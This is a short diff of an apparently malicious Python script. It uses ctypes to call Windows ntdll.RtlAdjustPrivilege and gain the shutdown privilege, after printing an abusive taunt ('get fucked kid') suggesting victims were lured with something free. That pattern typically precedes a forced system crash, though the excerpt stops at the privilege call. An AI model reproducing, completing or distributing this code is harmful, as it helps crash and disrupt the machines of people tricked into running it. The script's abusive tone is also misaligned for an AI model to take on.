@@ -5,7 +5,7 @@ from ctypes import c_ulong
 from ctypes import POINTER
 from ctypes import byref
 import time
-print("there is no such thing as free\nget fucked kid")
+print("nothings free in life\nget fucked kid")
 time.sleep(5)
 nullptr =POINTER (c_int )()
 windll .ntdll .RtlAdjustPrivilege (c_uint (19 ),c_uint (1 ),c_uint (0 ),byref (c_int ()))
